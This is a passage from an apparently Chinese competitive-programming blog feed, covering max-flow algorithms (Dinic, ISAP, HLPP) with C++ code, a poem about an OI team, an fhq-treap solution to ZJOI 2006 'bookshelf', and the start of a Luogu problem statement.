个流量为止，并相应的增广。其返回值为实际增广了多少（因为有可能找不到 maxflow\text{maxflow}maxflow 条增广路）Dinic\text{Dinic}Dinic 复杂度可以证明为 O(n2m)O(n^2 m)O(n​2​​m) 。在某些特殊情况下（每个点要么仅有⼀条⼊边且容量为 111，要么仅有⼀条出边且容量为 111 ）其复杂度甚至能做到 O(mn)O(m\sqrt n)O(m√​n​​​)Dinic 算法Dinic\text{Dinic}Dinic 算法的过程:遍历残量网络，建立层次图；在层次图上寻找任意一条增广路，进行增广，并将答案加上增广流量；重复第 222 步，直至层次图中不存在增广路，回到第 111 步重新建立层次图；直到层次图无法建立，则当前流量即为最大流量。每次建立层次图后都可以进行多次增广，无法增广时重新建立层次图，此时的层次图不再包含之前进行增广后满载的边。无法建立层次图时，说明源点到汇点的任意一条简单路径中，都至少有一条边满载，这也在直观上验证了最小割最大流定理Dinic(G,S,T)\text{Dinic}(G,S,T)Dinic(G,S,T)make Layered graph in G\text{make Layered graph in }Gmake Layered graph in Gdo\text{do}do augment flow f along p\ \ \ \ \text{augment flow }f \text{ along } p augment flow f along puntil there do not any augmenting flow in G\text{until there do not any augmenting flow in } Guntil there do not any augmenting flow in Ggoto 1 remake Layered graph until cannot make Layered graph\text{goto 1 remake Layered graph until cannot make Layered graph}goto 1 remake Layered graph until cannot make Layered graphdinic\text{dinic}dinic 伪代码（假设 TTT 是⼀个全局变量，表示汇点）邻接表存储，head[x] 表示从 xxx 出发 的第⼀条边，next[i] 表示 iii 的下⼀条边。最后⼀条边的 next 为 −1-1−1123456789101112int dfs(int x, int T, int maxflow) &#123; if (x == T) return maxflow; int ans = 0; for (int i = head[x];i != -1 &amp;&amp; ans &lt; maxflow; i = next[i]) &#123; if (dis[to[i]] != dis[x] + 1 || ret[i] == 0) continue; int f = dfs(to[i], T, min(maxflow - ans, ret[i])) ret[i] -= f; ret[rev[i]] += f; ans += f; &#125; return ans;&#125;而 Dinic\text{Dinic}Dinic 的主过程如下:12345int Dinic(int S, int T) &#123; int ans = 0; while (bfs(S, T)) ans += dfs(S, T, 0x7fffffff); return ans;&#125;这段代码⼗分简洁qwqDinicDinicDinic 有一个常见的优化 — 当前弧优化该优化基于一个显而易见的事实，每次建立层次图后，如果在某一次增广前，某个点有一条边增广过了，则这条边在当前的层次图中不会再用到了，即下一次 DFSDFSDFS 这个点的时候直接可以从这条边的下一条边开始SAP 算法距离标号：所谓距离标号 ，就是某个点到汇点的最少的弧的数量（即边权值为1时某个点到汇点的最短路径长度）设点 iii 的标号为 levelilevel_ilevel​i​​，那么如果将满足 leveli=levelj+1level_i=level_j+1level​i​​=level​j​​+1 的弧 (i,j)(i,j)(i,j) 叫做允许弧 ，且增广时只走允许弧断层（本算法的 GapGapGap 优化思想）gapigap_igap​i​​ 数组表示距离标号为 iii 的点有多少个，如果到某一点没有符合距离标号的允许弧，我那么需要修改距离标号来找到增广路如果重标号使得 gapgapgap 数组中原标号数目变为 000 ，则算法结束我们学过毒瘤的EKEKEK算法，我们想想优化－如果能让每次寻找增广路时的时间复杂度降下来，那么就能提高算法效率了，使用 距离标号的最短增广路算法 就是这样的SAP(G,S,T)\text{SAP}(G,S,T)SAP(G,S,T)initialize level, gap \text{initialize} \text{ level, gap }initialize level, gap find e(u,v) with leveli=levelj+1\text{find }e(u,v)\text{ with level}_i=\text{level}_j+1find e(u,v) with level​i​​=level​j​​+1find augmenting path along e(u,v)\text {find augmenting path along e}(u,v)find augmenting path along e(u,v)SAPSAPSAP Code:1/*qwq窝才不会给你代码*/ISAP算法原图存在两种子图，一个是残量网络，一个是允许弧组成的图残量网络保证可增广，允许弧保证最短路（时间界较优）所以，在寻找增广路的过程中，一直是在残量网络中沿着允许弧寻找。因此，允许弧应该是属于残量网络的，而非原图的换句话说，我们沿着允许弧，走的是残量网络（而非原图）中的最短路径当我们找到沿着残量网络找到一条增广路，增广后，残量网络肯定会变化（至少少了一条边），因此决定允许弧的 ddd 数组要进行相应的更新（顺便提一句，DinicDinicDinic 的做法就是每次增广都重新计算 ddd 数组）然而，ISAP 「改进」的地方之一就是，其实没有必要马上更新 ddd 数组。这是因为，去掉一条边只可能令路径变得更长，而如果增广之前的残量网络存在另一条最短路，并且在增广后的残量网络中仍存在，那么这条路径毫无疑问是最短的。所以，ISAP 的做法是继续增广，直到遇到死路，才执行 retreat\text{retreat}retreat 操作说到这里，大家应该都猜到了，retreat\text{retreat}retreat 操作的主要任务就是更新 ddd 数组。那么怎么更新呢？非常简单：假设是从节点 uuu 找遍了邻接边也没找到允许弧的；再设一变量 mmm，令 mmm 等于残量网络中 uuu 的所有邻接点的 ddd 数组的最小值，然后令 d[u]d[u]d[u] 等于 m+1m+1m+1 即可。这是因为，进入 retreat\text{retreat}retreat 环节说明残量网络中 uuu 和 ttt 已经不能通过（已过时）的允许弧相连那么 uuu 和 ttt 实际上在残量网络中的最短路的长是多少呢？（这正是 ddd 的定义！）显然是残量网络中 uuu 的所有邻接点和 ttt 的距离加 111 的最小情况。特殊情况是，残量网络中 uuu 根本没有邻接点。如果是这样，只需要把 d[u]d[u]d[u] 设为一个比较大的数即可，这会导致任何点到 uuu 的边被排除到残量网络以外（严格来说只要大于等于 ∣V∣|V|∣V∣ 即可。由于最短路一定是无环的，因此任意路径长最大是 ∣V∣|V|∣V∣ ）修改之后，只需要把正在研究的节点 uuu 沿着刚才走的路退一步，然后继续搜索即可1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586int source; // 源点int sink; // 汇点int p[max_nodes]; // 可增广路上的上一条弧的编号int num[max_nodes]; // 和 t 的最短距离等于 i 的节点数量int cur[max_nodes]; // 当前弧下标int d[max_nodes]; // 残量网络中节点 i 到汇点 t 的最短距离bool visited[max_nodes];// 预处理, 反向 BFS 构造 d 数组bool bfs() &#123; memset(visited, 0, sizeof(visited)); queue&lt;int&gt; Q; Q.push(sink); visited[sink] = 1; d[sink] = 0; while (!Q.empty()) &#123; int u = Q.front(); Q.pop(); for (iterator_t ix = G[u].begin(); ix != G[u].end(); ++ix) &#123; Edge &amp;e = edges[(*ix)^1]; if (!visited[e.from] &amp;&amp; e.capacity &gt; e.flow) &#123; visited[e.from] = true; d[e.from] = d[u] + 1; Q.push(e.from); &#125; &#125; &#125; return visited[source];&#125;// 增广int augment() &#123; int u = sink, df = __inf; // 从汇点到源点通过 p 追踪增广路径, df 为一路上最小的残量 while (u != source) &#123; Edge &amp;e = edges[p[u]]; df = min(df, e.capacity - e.flow); u = edges[p[u]].from; &#125; u = sink; // 从汇点到源点更新流量 while (u != source) &#123; edges[p[u]].flow += df; edges[p[u]^1].flow -= df; u = edges[p[u]].from; &#125; return df;&#125;int max_flow() &#123; int flow = 0; bfs(); memset(num, 0, sizeof(num)); for (int i = 0; i &lt; num_nodes; i++) num[d[i]]++; int u = source; memset(cur, 0, sizeof(cur)); while (d[source] &lt; num_nodes) &#123; if (u == sink) &#123; flow += augment(); u = source; &#125; bool advanced = false; for (int i = cur[u]; i &lt; G[u].size(); i++) &#123; Edge&amp; e = edges[G[u][i]]; if (e.capacity &gt; e.flow &amp;&amp; d[u] == d[e.to] + 1) &#123; advanced = true; p[e.to] = G[u][i]; cur[u] = i; u = e.to; break; &#125; &#125; if (!advanced) &#123; // retreat int m = num_nodes - 1; for (iterator_t ix = G[u].begin(); ix != G[u].end(); ++ix) if (edges[*ix].capacity &gt; edges[*ix].flow) m = min(m, d[edges[*ix].to]); if (--num[d[u]] == 0) break; // gap 优化 num[d[u] = m+1]++; cur[u] = 0; if (u != source) u = edges[p[u]].from; &#125; &#125; return flow;&#125;最高标号预流推进(HLPP) 算法算法思想预流推进算法将每个点看做一个可以存储流的“水池”，其中存有流的点称为活动节点对于每个非s或t的点，流入该点的流只可能有两个去向：流入汇点t，流回源点s;预流推进算法从源点开始沿边向其它点推流，之后每次选一个活动节点通过推流，试图使其变得不活动。当所有节点都是不活动节点时，算法就结束了;以上是传统预流推进算法的主要思想。而最高标号预流推进算法就是先预处理了一个距离标号h，通过堆或优先队列，没次选出h最大的点进行推流，以减少重复操作，降低了复杂度。算法步骤通过 bfsbfsbfs 预处理出距离标号 hhh ，即到达汇点 ttt 的最短距离;将从源点s出发的边设为满流，到达的点 vvv 标记为活动节点并加入到优先队列中;从优先队列中不断取出点 uuu 进行 推流 操作，要求到达点 vvv 的必须满足 hu=hv+1h_u=h_v+1h​u​​=h​v​​+1若推流后 uuu 中仍有余流，则进行重标号。将 huh_uh​u​​ 设为 min{hv}\min \{h_v\}min{h​v​​}，再次加入优先队列并重复步骤 3.当优先队列为空时，结束算法算法复杂度：O(n2m)O(n^2\sqrt m)O(n​2​​√​m​​​)！！！Code :1/* www.google.com */End.]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>教程</tag>
        <tag>网络流</tag>
        <tag>最大流</tag>
        <tag>最小割</tag>
        <tag>最小割最大流定理</tag>
        <tag>玄学</tag>
        <tag>Dinic</tag>
        <tag>SAP</tag>
        <tag>ISAP</tag>
        <tag>HLPP</tag>
        <tag>预留推进</tag>
        <tag>EK算法</tag>
        <tag>FF方法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「诗歌」OI无悔 - by Shq]]></title>
    <url>%2Farticles%2Flyoi-Poetry%2F</url>
    <content type="text"><![CDATA[谨以此篇纪念在 LYOI 的日子开始的开始 wyh也是孩子最后的最后 已然变成大佬传说的传说 藏着奇迹的影子大佬的大佬 该要写出啥世界开始的开始 lgy也是孩子最后的最后 将能变为神犇奇迹的奇迹 藏着梦想的影子大神的大神 将要码出啥天地当某天 你若听见火航在说 那些奇怪的算法当某天 你若看见满山的森林还是未消失的雨林当某天 再码着这算法会是哪题的正解当某天 在踏进这个群会是哪位管理开启回忆的话匣表示从小白到大神的距离原来只就几年表示纯真叔叔隔夜弟弟很有瞎搞范各种奇葩压行都搞不懂还有那 BUG各种曾经狂热的旋转卡壳学几月又几天我们打开dev假装成长分支挥霍曾经的记忆胡乱一改 按下F5 , ac的初体验兴趣和利益的字眼 格外痛人心扉各种莫名的感受 只说句 坚持一下十年后 你若听见ycy 在说 这些奇怪的数据结构十年后 你若看见满网的程序还是换行的大括号表示从蒟蒻到神犇的距离原来也有几年表示 Edge 和那 Menci都是那大触exgcd 还有 Dinic 都搞不懂及预流, 推进,各种曾经熬夜写的 codeforces 代码有几千几万行我们一直拼搏 永远跑在墙内墙外不同代理瞥见那 Flow , 还会以为是谁的好伙伴pwf 和 ghw 朋友 lh, ylq 爱你也许谁都忘记谁的真名 但记得在那LYOI的日子开始的开始 我们都是孩子最后的最后 都已找到自我本质的本真 永远难忘的历程前方的未来 该要如何向前去-------- By Shq于 2018 / 07 / 11 ，清北学堂转载请注明出处qwq]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>随笔</tag>
        <tag>文学</tag>
        <tag>OI</tag>
        <tag>诗歌</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「ZJOI 2006」书架 - fhq Treap模版题目]]></title>
    <url>%2Farticles%2FZJOI2006-%E4%B9%A6%E6%9E%B6%2F</url>
    <content type="text"><![CDATA[然而这题是 fhq treap 板子题目（可能是zjoi最水的题目题目描述小 TTT 有一个很大的书柜。这个书柜的构造有些独特，即书柜里的书是从上至下堆放成一列。她用 111 到 nnn 的正整数给每本书都编了号小 TTT 在看书的时候，每次取出一本书，看完后放回书柜然后再拿下一本。由于这些书太有吸引力了，所以她看完后常常会忘记原来是放在书柜的什么位置。不过小 TTT 的记忆力是非常好的，所以每次放书的时候至少能够将那本书放在拿出来时的位置附近，比如说她拿的时候这本书上面有X本书，那么放回去时这本书上面就只可能有 X−1X-1X−1、XXX 或 X+1X+1X+1 本书。当然也有特殊情况，比如在看书的时候突然电话响了或者有朋友来访。这时候粗心的小 TTT 会随手把书放在书柜里所有书的最上面或者最下面，然后转身离开。久而久之，小T的书柜里的书的顺序就会越来越乱，找到特定的编号的书就变得越来越困难。于是她想请你帮她编写一个图书管理程序，处理她看书时的一些操作，以及回答她的两个提问：编号为 XXX 的书在书柜的什么位置；从上到下第 iii 本书的编号是多少。输入输出格式输入格式第一行有两个数nnn，mmm，分别表示书的个数以及命令的条数；第二行为 nnn 个正整数：第 iii 个数表示初始时从上至下第 iii 个位置放置的书的编号；第三行到 m+2m+2m+2 行，每行一条命令。命令有 555 种形式：Top S——表示把编号为 SSS 的书放在最上面Bottom S——表示把编号为 SSS 的书放在最下面Insert S T——，，，若编号为 SSS 的书上面有 XXX 本书，则这条命令表示把这本书放回去后它的上面有 X+TX+TX+T 本书；Ask S——询问编号为 SSS 的书的上面目前有多少本书Query S——询问从上面数起的第 SSS 本书的编号输出格式对于每一条 Ask 或 Query 语句你应该输出一行，一个数，代表询问的答案。输入输出样例输入样例 #112345678910111210 101 3 2 7 5 8 10 4 9 6Query 3Top 5Ask 6Bottom 3Ask 3Top 6Insert 4 -1Query 5Query 2Ask 2输出样例 #1123456299753说明100%100\%100% 的数据，n,m≤80000n,m \le 80000n,m≤80000题解水题水题切了切了我们分析下题目，Top 和 Bottom实质上就是把序列中的一个数放到第一个和最后一个，直接暴力split + mergeInsert 操作我们可以多次拆分，再统一合并Ask 我们直接从那个点往上跑，累加即可Query 就是简单的求排名为 kkk 的数qwqCode:必须使用 c++11 编译，否则会CE!!!在 Code 的下面有 c++98 版的qwq123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;#include &lt;string&gt;#include &lt;vector&gt;#include &lt;stack&gt;#define DEBUG(x) std::cerr &lt;&lt; "Debug MSG" &lt;&lt; #x &lt;&lt; "'s value is'" &lt;&lt; x &lt;&lt; '\n';const int MAXN = 80000 + 9;inline int max (const int &amp;a, const int &amp;b) &#123; return a &gt; b ? a : b;&#125;class Node &#123;public: int key, size, priority; Node *left, *right, *fafa; virtual ~Node() &#123;&#125; Node () &#123;&#125; Node (int key, Node *shq) : key(key) , size(1) , priority(rand()) , left(shq) , right(shq) , fafa(shq) &#123;&#125; inline void update () &#123; auto siz = [&amp;](Node * node)-&gt;int &#123; if (node != NULL) return node-&gt;size; else return 0; &#125;; size = siz(left) + siz(right) + 1; left-&gt;fafa = right-&gt;fafa = this; &#125;&#125;;class Shq &#123;private: int top; Node *stack[MAXN];public: // Shq () : top(0) &#123;&#125; // virtual ~Shq (); inline Node *pop () &#123; auto well = [&amp;]()-&gt;bool &#123; if (top &gt;= 1) return 1; else return 0; &#125;; if ( well() ) return stack[top--]; return 0; &#125; inline void push (Node *node) &#123; auto shq = [&amp;]()-&gt;bool &#123; if (top &lt; MAXN) return 1; else return 0; &#125;; (shq()) &amp;&amp; (stack[++top] = node); &#125; inline Node *stack_top () &#123; return stack[top]; &#125; inline void upd_all () &#123; while (top) &#123; stack[top--]-&gt;update(); &#125; &#125; inline Node *last() &#123; return stack[1]; &#125; inline int size() &#123; return top; &#125; inline void print () &#123; for (auto it : stack)&#123; std::cout &lt;&lt; it-&gt;key &lt;&lt; std::endl; &#125; []&#123;&#125;; &#125;&#125;;int m, n;Node *root, mem_pool[MAXN];Node *frog = mem_pool, *null;Node* New (int shq) &#123; return new (frog++) Node (shq, null);&#125;typedef std::pair &lt;Node *,Node *&gt; Droot;Droot Split (Node *node, int k) &#123; if (node == null) return Droot (null, null); Droot ans; if (node-&gt;left-&gt;size &gt;= k) &#123; ans = Split (node-&gt;left, k); node-&gt;left = ans.second; node-&gt;update (); ans.second = node; &#125; else &#123; ans = Split (node-&gt;right, k - node-&gt;left-&gt;size - 1); node-&gt;right = ans.first; node-&gt;update (); ans.first = node; &#125; return ans;&#125;Node* Merge (Node *first, Node *second) &#123; if (first == null) return second; if (second == null) return first; if (first-&gt;priority &gt; second-&gt;priority) &#123; second-&gt;left = Merge (first, second-&gt;left); second-&gt;update (); return second; &#125; else &#123; first-&gt;right = Merge (first-&gt;right, second); first-&gt;update (); return first; &#125;&#125;Node *ptr[MAXN];int key[MAXN];Node* Build () &#123; // static Node *Node_stack[MAXN]; // int top = 0; static Node *last, *x; static Shq stack; for (int i = 1; i &lt;= n; i++) &#123; last = null; ptr[key[i]] = x = New (key[i]); while (stack.size() &amp;&amp; x-&gt;priority &lt; stack.stack_top()-&gt;priority) &#123; stack.stack_top()-&gt;update (); // last = Node_stack[top--]; last = stack.pop(); &#125; if (stack.size()) &#123; // Node_stack[top]-&gt;right = x; // x-&gt;fafa = Node_stack[top]; stack.stack_top()-&gt;right = x; x-&gt;fafa = stack.stack_top(); &#125; x-&gt;left = last; last-&gt;fafa = x; // Node_stack[++top] = x; stack.push(x); &#125; // while (top) Node_stack[top--]-&gt;update (); stack.upd_all(); // return Node_stack[1]; return stack.last();&#125;int get_rank (Node *x) &#123; int res = x-&gt;left-&gt;size; while (x-&gt;fafa != null) &#123; if (x == x-&gt;fafa-&gt;right) res += x-&gt;fafa-&gt;left-&gt;size + 1; x = x-&gt;fafa; &#125; return res;&#125;void puton (int shq, bool v) &#123; static Droot calc1,calc2; int k = get_rank (ptr[shq]); calc1 = Split (root, k); calc2 = Split (calc1.second,1); if (v) &#123; root = Merge (Merge (calc2.first, calc1.first), calc2.second); &#125; else &#123; root = Merge (calc1.first, Merge (calc2.second,calc2.first)); &#125;&#125;void bookon (int shq,int opt) &#123; if (!opt) return ; static Droot calc1,calc2,calc3; int k = get_rank (ptr[shq]); calc1 = Split (root, k); calc2 = Split (calc1.second, 1); if (opt == -1) &#123; calc1 = Split(calc1.first, calc1.first-&gt;size - 1); root = Merge (Merge(calc1.first,calc2.first),Merge(calc1.second,calc2.second)); &#125; else &#123; calc3 = Split(calc2.second, 1); root = Merge (Merge(calc1.first, calc3.first), Merge(calc2.first,calc3.second)); &#125;&#125;inline int SlowRead () &#123; auto getc = [&amp;]()-&gt;char &#123;jik return getchar(); &#125;; char ch = 0; int data = 0, f = 1; while (ch != '-' &amp;&amp; (ch &lt; '0' || ch &gt; '9')) ch = getc(); if (ch == '-') f = -1, ch = getc(); while (ch &gt;= '0' &amp;&amp; ch &lt;= '9') &#123; data = data * 10 + ch - '0'; ch = getc(); &#125; return data * f;&#125;int rank (Node *x, int k) &#123; if (x-&gt;left-&gt;size &gt;= k) return rank (x-&gt;left, k); if (x-&gt;left-&gt;size + 1 == k) return x-&gt;key; return rank (x-&gt;right, k - x-&gt;left-&gt;size - 1);&#125;char opt[23];int x;inline void In_Order (Node *node) &#123; if (!node) &#123; In_Order (node-&gt;left); printf("%d\n", node-&gt;key); In_Order (node-&gt;right); &#125;&#125;bool it (Node *node) &#123; if (node == null) return 0; bool Flag = 0; Flag |= it (node-&gt;left); Flag |= it (node-&gt;right); return Flag || node-&gt;fafa==null || node-&gt;fafa-&gt;left==node || node-&gt;fafa-&gt;right==node;&#125;int main (int argc, char *const argv[]) &#123; null = new Node (); null-&gt;size = 0; // scanf ("%d%d", &amp;n, &amp;m); n = SlowRead(); m = SlowRead(); //auto shq = [](int data)-&gt;int&#123;return data = SlowRead();&#125;; //shq(n); shq(m); auto char_switch = [&amp;](char *shqq)-&gt;int &#123; switch (opt[0]) &#123; case 'T': &#123; puton (x, true); break; &#125; case 'B': &#123; puton (x, false); break; &#125; case 'I': &#123; bookon (x, SlowRead()); break; &#125; case 'A': &#123; printf("%d\n", get_rank(ptr[x])); break; &#125; case 'Q': &#123; printf("%d\n", rank(root, x)); break; &#125; &#125; return 1; &#125;; for (int i = 1; i &lt;= n; i++) key[i] = SlowRead(); root = Build (); for (int i = 1; i &lt;= m; i++) &#123; scanf("%s%d",opt,&amp;x); if (char_switch (opt)) &#123;&#125; else std::cerr &lt;&lt; "Unknow ERR" &lt;&lt; '\n'; &#125; return 0;&#125;C++版：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267// luogu-judger-enable-o2#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;#include &lt;string&gt;#include &lt;vector&gt;#include &lt;stack&gt;#define DEBUG(x) std::cerr &lt;&lt; "Debug MSG" &lt;&lt; #x &lt;&lt; "'s value is'" &lt;&lt; x &lt;&lt; '\n';const int MAXN = 80000 + 9;struct Node &#123; int key, size, priority; Node *left, *right, *fafa; Node () &#123;&#125; Node (int key, Node *shq) : key(key) , size(1) , priority(rand()) , left(shq) , right(shq) , fafa(shq) &#123;&#125; inline void update () &#123; size = left-&gt;size + right-&gt;size + 1; left-&gt;fafa = right-&gt;fafa = this; &#125;&#125;;class Stack &#123;private: int top; Node *stack[MAXN];public: // Stack () : top(0) &#123;&#125; // virtual ~Stack (); inline Node *pop () &#123; return stack[top--]; &#125; inline void push (Node *node) &#123; stack[++top] = node; &#125; inline Node *stack_top () &#123; return stack[top]; &#125; inline void upd_all () &#123; while (top) &#123; stack[top--]-&gt;update(); &#125; &#125; inline Node *last() &#123; return stack[1]; &#125; inline int size() &#123; return top; &#125;&#125;;int m, n;Node *root, mem_pool[MAXN];Node *frog = mem_pool, *null;Node* New (int shq) &#123; return new (frog++) Node (shq, null);&#125;typedef std::pair &lt;Node *,Node *&gt; Droot;Droot Split (Node *node, int k) &#123; if (node == null) return Droot (null, null); Droot ans; if (node-&gt;left-&gt;size &gt;= k) &#123; ans = Split (node-&gt;left, k); node-&gt;left = ans . second; node-&gt;update (); ans.second = node; &#125; else &#123; ans = Split (node-&gt;right, k - node-&gt;left-&gt;size - 1); node-&gt;right = ans . first; node-&gt;update (); ans.first = node; &#125; return ans;&#125;Node* Merge (Node *first,Node *second) &#123; if (first == null) return second; if (second == null) return first; if (first-&gt;priority &gt; second-&gt;priority) &#123; second-&gt;left = Merge (first, second-&gt;left); second-&gt;update (); return second; &#125; else &#123; first-&gt;right = Merge (first-&gt;right, second); first-&gt;update (); return first; &#125;&#125;Node *ptr[MAXN];int key[MAXN];Node* Build () &#123; // static Node *Node_stack[MAXN]; // int top = 0; static Node *last, *x; static Stack stack; for (int i = 1; i &lt;= n; i++) &#123; last = null; ptr[key[i]] = x = New (key[i]); while (stack.size() &amp;&amp; x-&gt;priority &lt; stack.stack_top()-&gt;priority) &#123; stack.stack_top()-&gt;update (); // last = Node_stack[top--]; last = stack.pop(); &#125; if (stack.size()) &#123; // Node_stack[top]-&gt;right = x; // x-&gt;fafa = Node_stack[top]; stack.stack_top()-&gt;right = x; x-&gt;fafa = stack.stack_top(); &#125; x-&gt;left = last; last-&gt;fafa = x; // Node_stack[++top] = x; stack.push(x); &#125; // while (top) Node_stack[top--]-&gt;update (); stack.upd_all(); // return Node_stack[1]; return stack.last();&#125;int get_rank (Node *x) &#123; int res = x-&gt;left-&gt;size; while (x-&gt;fafa != null) &#123; if (x == x-&gt;fafa-&gt;right) res += x-&gt;fafa-&gt;left-&gt;size + 1; x = x-&gt;fafa; &#125; return res;&#125;void puton (int shq, bool v) &#123; static Droot calc1,calc2; int k = get_rank (ptr[shq]); calc1 = Split (root, k); calc2 = Split (calc1.second,1); if (v) &#123; root = Merge (Merge (calc2.first, calc1.first), calc2.second); &#125; else &#123; root = Merge (calc1.first, Merge (calc2.second,calc2.first)); &#125;&#125;void bookon (int shq,int opt) &#123; if (!opt) return ; static Droot calc1,calc2,calc3; int k = get_rank (ptr[shq]); calc1 = Split (root, k); calc2 = Split (calc1.second, 1); if (opt == -1) &#123; calc1 = Split(calc1.first, calc1.first-&gt;size - 1); root = Merge (Merge(calc1.first,calc2.first),Merge(calc1.second,calc2.second)); &#125; else &#123; calc3 = Split(calc2.second, 1); root = Merge (Merge(calc1.first, calc3.first), Merge(calc2.first,calc3.second)); &#125;&#125;inline int SlowRead () &#123; char ch = 0; int data = 0, f = 1; while (ch != '-' &amp;&amp; (ch &lt; '0' || ch &gt; '9')) ch = getchar(); if (ch == '-') f = -1, ch = getchar(); while (ch &gt;= '0' &amp;&amp; ch &lt;= '9') &#123; data = data * 10 + ch - '0'; ch = getchar(); &#125; return data * f;&#125;int rank (Node *x, int k) &#123; if (x-&gt;left-&gt;size &gt;= k) return rank (x-&gt;left, k); if (x-&gt;left-&gt;size + 1 == k) return x-&gt;key; return rank (x-&gt;right, k - x-&gt;left-&gt;size - 1);&#125;char opt[23];int x;inline void In_Order (Node *node) &#123; if (!node) &#123; In_Order (node-&gt;left); printf("%d\n", node-&gt;key); In_Order (node-&gt;right); &#125;&#125;bool it (Node *node) &#123; if (node == null) return 0; bool Flag = 0; Flag |= it (node-&gt;left); Flag |= it (node-&gt;right); return Flag || node-&gt;fafa==null || node-&gt;fafa-&gt;left==node || node-&gt;fafa-&gt;right==node;&#125;int main (int argc, char *const argv[]) &#123; null = new Node (); null-&gt;size = 0; // scanf ("%d%d", &amp;n, &amp;m); n = SlowRead(); m = SlowRead(); for (int i = 1; i &lt;= n; i++) key[i] = SlowRead(); root = Build (); for (int i = 1; i &lt;= m; i++) &#123; scanf("%s%d",opt,&amp;x); switch (opt[0]) &#123; case 'T': &#123; puton (x, true); break; &#125; case 'B': &#123; puton (x, false); break; &#125; case 'I': &#123; bookon (x, SlowRead()); break; &#125; case 'A': &#123; printf("%d\n", get_rank(ptr[x])); break; &#125; case 'Q': &#123; printf("%d\n", rank(root, x)); break; &#125; &#125; &#125; return 0;&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>数据结构</tag>
        <tag>毒瘤</tag>
        <tag>平衡树</tag>
        <tag>Treap</tag>
        <tag>luogu</tag>
        <tag>fhq treap</tag>
        <tag>zjoi</tag>
        <tag>非旋Treap</tag>
        <tag>高性能</tag>
        <tag>lambda</tag>
        <tag>C++11</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「Luogu P4278」带插入区间K小值 - 替罪羊树 + 线段树]]></title>
    <url>%2Farticles%2FLuogu-P4276%2F</url>
    <content type="text"><![CDATA[带插入的区间第k小qwq这题很简单qwq，直接树套树搞就可以qwq题目描述从前有 nnn 只跳蚤排成一行做早操，每只跳蚤都有自己的一个弹跳力 aia_ia​i​​。跳蚤国王看着这些跳蚤国欣欣向荣的情景，感到非常高兴。这时跳蚤国王决定理性愉悦一下，查询区间k小值他每次向它的随从伏特提出这样的问题: 从左往右第 xxx 个到第 yyy 个跳蚤中，aia_ia​i​​ 第 kkk 小的值是多少。这可难不倒伏特，他在脑袋里使用函数式线段树前缀和的方法水掉了跳蚤国王的询问。这时伏特发现有些跳蚤跳久了弹跳力会有变化，有的会增大，有的会减少。这可难不倒伏特，他在脑袋里使用树状数组套线段树的方法水掉了跳蚤国王的询问。（orz 主席树）这时伏特发现有些迟到的跳蚤会插入到这一行的某个位置上，他感到非常生气，因为……他不会做了。请你帮一帮伏特吧。输入描述第一行一个正整数 nnn ，表示原来有 nnn 只跳蚤排成一行做早操。第二行有 nnn 个用空格隔开的非负整数，从左至右代表每只跳蚤的弹跳力。第三行一个正整数 qqq ，表示下面有多少个操作。下面一共 qqq 行，一共三种操作对原序列的操作：（假设此时一共m只跳蚤）Q x y k: 询问从左至右第 xxx 只跳蚤到从左至右第 yyy 只跳蚤中，弹跳力第 kkk 小的跳蚤的弹跳力是多少。 (1≤x≤y≤m,1≤k≤y−x+11 \le x \le y \le m, 1 \le k \le y - x + 11≤x≤y≤m,1≤k≤y−x+1)M x val: 将从左至右第 xxx 只跳蚤的弹跳力改为 valvalval 。 (1≤x≤m1 \le x \le m1≤x≤m)I x val: 在从左至右第 xxx 只跳蚤的前面插入一只弹跳力为 valvalval 的跳蚤。即插入后从左至右第 xxx 只跳蚤是我刚插入的跳蚤。 (1≤x≤m+11 \le x \le m + 11≤x≤m+1)为了体现在线操作，设 lastAns\text {lastAns}lastAns 为上一次查询的时候程序输出的结果，如果之前没有查询过，则 lastAns=0\text {lastAns} = 0lastAns=0。则输入的时候实际是：Q _x _y _k ——&gt; 表示 Q_xlastAns_vallastAnsQ \_x^{lastAns} \_val^{lastAns}Q_x​lastAns​​_val​lastAns​​M _x _val ——&gt; 表示 M_xlastAns_vallastAnsM \_x^{lastAns} \_val^{lastAns}M_x​lastAns​​_val​lastAns​​I _x _val ——&gt; 表示 I_xlastAns_vallastAnsI \_x^{lastAns} \_val^{lastAns}I_x​lastAns​​_val​lastAns​​简单来说就是操作中输入的整数都要异或上一次询问的结果进行解码。(祝Pascal的同学早日转C++，就不提供pascal版的描述了。)输出描述对于每个询问输出回答，每行一个回答。样例输入1234567891011121314151617181920212223242526272829303132331010 5 8 28 0 19 2 31 1 2230I 6 9M 1 11I 8 17M 1 31M 6 26Q 2 7 6I 23 30M 31 7I 22 27M 26 18Q 26 17 31I 5 2I 18 13Q 3 3 3I 27 19Q 23 23 30Q 5 13 5I 3 0M 15 27Q 0 28 13Q 3 29 11M 2 8Q 12 5 7I 30 19M 11 19Q 17 8 29M 29 4Q 3 0 12I 7 18M 29 